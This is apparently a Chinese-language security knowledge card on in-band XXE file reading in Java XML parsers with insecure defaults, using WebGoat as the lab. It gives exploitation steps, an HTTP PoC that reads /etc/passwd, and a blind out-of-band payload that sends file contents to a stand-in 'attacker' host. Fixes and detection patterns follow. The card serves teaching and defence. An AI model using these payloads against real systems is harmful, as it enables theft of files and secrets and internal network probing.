---
id: web-generic-xxe-inband-file-read-default-insecure
title: Java XML 解析器默认允许外部实体导致有回显文件读取
type: scenario
domain: web
path: web/generic/xxe
technique: xxe-inband-file-read-default-insecure
aliases:
- XXE 文件读取
- 一般实体 XXE
- file:///etc/passwd
- 默认不安全解析
- DocumentBuilder XXE
- Content-Type 混淆 XML
tags:
- xxe
- file-read
- java
- xml
- external-entity
- insecure-default
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T03:15:02+08:00'
  notes: 已对照原文2.4.1模块4/7核对：secure 默认 false，仅 session 有 applySecurity 才启用安全解析；Content-Type 分支 application/json 走 parseJson、application/xml 走 XML 解析；一般实体 file:///etc/passwd 有回显读取成功。原文未给组件版本（WebGoat 8.2.2 靶场），未设置 affected_versions。未复现。
---

## 一句话结论

Java 应用解析用户提交的 XML 时，如果没有显式关闭外部实体（或把“安全模式”做成默认 false 的开关），攻击者用 `<!ENTITY file SYSTEM "file:///etc/passwd">` 就能让解析器读取本地文件，实体内容随业务响应回显；同一接口若在 JSON 之外还接受 `application/xml`，常被忽略而形成入口。

## 原理

- XML 规范允许在 DOCTYPE 中声明外部实体，值可以是 `file://`、`http://` 等 URI。解析器遇到 `&file;` 时会去读取该 URI 并把内容替换进文档。
- Java 的 `DocumentBuilderFactory`/`SAXParserFactory` 默认不启用 `FEATURE_SECURE_PROCESSING`，且 `disallow-doctype-decl`、`external-general-entities`、`external-parameter-entities` 等特性默认允许；未显式关闭时外部实体可用。
- 漏洞代码往往把“安全解析”做成参数：`boolean secure = false; if (session.getAttribute("applySecurity") != null) secure = true;`，默认分支解析用户 XML 时不设任何限制。
- 有回显时，实体内容被拼进文本节点，业务响应（评论内容、转换结果、错误信息）原样返回，攻击者直接读到文件；无回显时改用参数实体 + 外部 DTD 外带（见关联卡）。
- REST 接口只按 `Content-Type` 分支处理：`application/json` 走 JSON 解析，`application/xml` 走 XML 解析。开发者只测 JSON 路径，XML 分支的解析器没有加固。
- 危害不止读文件：`http://` 实体可探测内网/SSRF，`jar:`/`file:` 可读配置与密钥，特定解析器/协议下可进一步 RCE。

## 触发条件

- 接口接受用户可控 XML（直接 XML 接口，或 JSON 接口同时支持 `application/xml`）。
- XML 解析器未禁用 DOCTYPE/外部实体，或安全开关默认为 false。
- 解析结果（实体内容）进入响应、错误信息或可观测的输出。
- 进程对目标文件有读权限。

## 利用步骤

1. 找到接受 XML 的入口：显式 XML API、文件上传（docx/svg/xml）、SOAP、或同时支持 XML 的 JSON 接口。
2. 发送带外部实体的 XML，先用 `file:///etc/passwd`（Linux）或 `file:///c:/windows/win.ini`（Windows）验证。
3. 观察响应中是否出现文件内容；若无回显，改用 OOB 参数实体。
4. 若接口默认按 JSON 处理，修改 `Content-Type: application/xml` 或 `text/xml` 再试。
5. 读取应用配置、密钥、源码；或把 `SYSTEM` 换成内网 URL 做 SSRF 探测。

## PoC

```http
POST /api/comment HTTP/1.1
Host: target
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<comment>
  <text>&file;</text>
</comment>
```

```text
# 预期：响应/评论内容中出现 /etc/passwd 的文本。
# 无回显时改用外部 DTD：
#   <!ENTITY % file SYSTEM "file:///etc/passwd">
#   <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://attacker/?p=%file;'>">
#   %int;%send;
```

## 变体与关联

- 变体：参数实体 + 远程 DTD 做盲 XXE 外带；用 DNS 日志规避 HTTP 出网限制。
- 变体：`php://filter`、`jar:`、`netdoc:` 等协议读取源码/列目录（取决于解析器）。
- 变体：SVG/DOCX/XLSX 上传后服务端解析，XML 载荷藏在压缩包/图片内。
- 关联：[[web-generic-xxe-oob-exfil]]（盲 XXE 的 OOB 外带）。
- 关联：[[web-generic-xxe-reflected-xml-ssrf-internal-service]]（XML 实体触发 SSRF）。
- 边界：解析器已设置 `disallow-doctype-decl=true`、禁用外部实体、或使用默认安全的解析库/版本时，该 payload 不成立；有回显还依赖实体内容进入响应。

## 检测与防御

- 修复：解析前显式设置 `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`，并禁用 `external-general-entities`/`external-parameter-entities`、`XMLConstants.FEATURE_SECURE_PROCESSING`；`DocumentBuilderFactory` 设置 `setXIncludeAware(false)`、`setExpandEntityReferences(false)`。
- 修复：不要提供“安全模式”开关给业务代码；解析器统一封装为安全默认。
- 加固：只接受必要格式，JSON 接口不要顺带支持 XML；对上传的 XML 类文件做解析前隔离/沙箱；限制出网与文件读权限。
- 检测：请求体含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、`http://`；XML 接口返回内容出现系统文件特征；解析器访问非预期 URI/DNS；异常外部 DTD 请求。
